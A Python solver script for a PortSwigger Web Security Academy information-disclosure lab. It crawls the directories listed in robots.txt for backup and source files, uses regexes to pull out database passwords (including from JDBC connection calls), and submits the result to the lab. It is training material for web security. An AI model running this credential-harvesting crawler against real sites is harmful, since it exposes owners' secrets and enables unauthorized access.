#!/usr/bin/env python3
"""
Source code disclosure via backup files
PortSwigger Web Security Academy -- Information Disclosure

Companion script for the writeup: 03-backup-files.md

What this does:
    Pulls every Disallow entry out of robots.txt (not just /backup specifically),
    browses each resulting directory for a listing, and follows any linked file
    whose name looks like a backup of source code (.bak/.old/.orig/~/.swp or a
    bare source extension). Runs several password-extraction patterns against
    whatever it downloads, including one written specifically for the Java JDBC
    ConnectionBuilder.from() positional-argument call shape used in this lab
    (driver, type, host, port, db, user, password -- password is the last arg).

Usage:
    python 03-backup-files.py <lab-url>
    e.g. python 03-backup-files.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
from urllib.parse import urljoin
import httpx

PW_PATTERNS = [
    r'(?:password|passwd|pwd)\s*=\s*["\']([^"\']+)["\']',
    r'(?:password|passwd|pwd)["\s:=]+["\']?([^\s"\'<;,)]+)',
    r'(?:POSTGRES_PASSWORD|MYSQL_PASSWORD|DB_PASSWORD)\s*=\s*["\']?([^\s"\'<;]+)',
    # Java JDBC ConnectionBuilder positional args: driver, type, host, port, db, user, password
    r'ConnectionBuilder\.from\(\s*"[^"]*",\s*"[^"]*",\s*"[^"]*",\s*\d+,\s*"[^"]*",\s*"[^"]*",\s*"([^"]+)"',
]


def solve(lab_url: str) -> None:
    client = httpx.Client(verify=False, timeout=15, follow_redirects=True)

    rr = client.get(f"{lab_url}/robots.txt")
    print(f"[*] robots.txt: {rr.status_code}")

    disallowed = re.findall(r"Disallow:\s*(/\S+)", rr.text)
    backup_dirs = ["/backup"] + [d for d in disallowed if d != "/backup"]

    for bdir in backup_dirs:
        br = client.get(f"{lab_url}{bdir}")
        if br.status_code != 200:
            continue
        print(f"[+] {bdir} directory found")

        files = re.findall(r"href=['\"]([^'\"]+)['\"]", br.text)
        for f in files:
            if not any(ext in f for ext in [".bak", ".old", ".orig", "~", ".swp", ".java", ".py", ".php", ".rb"]):
                continue
            file_url = f if f.startswith("http") else urljoin(lab_url, f)
            fr = client.get(file_url)
            if fr.status_code != 200:
                continue
            print(f"[+] Backup file: {file_url}")

            for pat in PW_PATTERNS:
                pw_match = re.search(pat, fr.text, re.IGNORECASE)
                if pw_match:
                    password = pw_match.group(1)
                    print(f"[+] Password: {password}")
                    sr = client.post(f"{lab_url}/submitSolution", data={"answer": password})
                    if "Congratulations" in sr.text or '"correct":true' in sr.text:
                        print("[+] Lab solved!")
                    else:
                        print(f"[!] Submit response: {sr.status_code}")
                    return
            print(f"    Content preview: {fr.text[:300]}")

    print("[-] Could not find backup file or password")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
